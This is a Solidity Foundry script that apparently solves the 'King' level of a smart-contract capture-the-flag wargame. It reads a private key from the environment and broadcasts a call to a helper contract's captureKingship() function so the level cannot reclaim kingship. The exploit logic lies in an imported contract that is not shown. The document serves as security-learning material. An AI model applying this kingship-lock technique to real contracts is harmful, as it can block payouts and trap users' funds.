// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../lib/forge-std/src/Script.sol";
import {King} from "../src/L10__King.sol";
import {L10_Caller__King} from "../src/L10_Caller__King.sol";

// The contract below represents a very simple game: whoever sends it an amount
// of ether that is larger than the current prize becomes the new king. On such
// an event, the overthrown king gets paid the new prize, making a bit of ether
// in the process! As ponzi as it gets xD

// Such a fun game. Your goal is to break it.

// When you submit the instance back to the level, the level is going to reclaim
// kingship. You will beat the level if you can avoid such a self proclamation.

contract L10_Solution__King is Script {
    King public king =
        King(payable(0x464A14e15C11ab9daf5a51fcf58E2C204F44216B));
    L10_Caller__King public king_caller =
        L10_Caller__King(payable(0x0F49605720c66Aa985E70FBe6eDEA66b7593dc61));

    uint256 currentPrize = 1000000000000000;
    address currentKing = 0x3049C00639E6dfC269ED1451764a046f7aE500c6;
    address currentOwner = 0x3049C00639E6dfC269ED1451764a046f7aE500c6;

    function run() public {
        uint256 _robberPrivKey = vm.envUint("PRIV_KEY");

        currentKing = king._king();
        console.log("Prev king: %s", currentKing);

        vm.startBroadcast(_robberPrivKey);

        king_caller.captureKingship();

        vm.stopBroadcast();

        currentKing = king._king();
        console.log("New king: %s", currentKing);
    }
}
